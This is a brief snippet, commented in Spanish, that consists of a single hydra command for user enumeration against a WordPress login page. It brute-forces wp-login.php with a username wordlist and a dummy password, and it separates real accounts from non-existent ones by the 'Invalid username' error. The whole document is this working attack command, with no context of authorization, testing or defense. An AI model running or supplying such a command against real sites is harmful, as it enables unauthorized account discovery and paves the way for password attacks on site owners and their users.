// Con este comando podemos hacer un ataque de fuerza bruta al dominio y página específicada para enumerar usuarios existentes
hydra -L wordlist.txt -p "da_igual" dominio.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -V
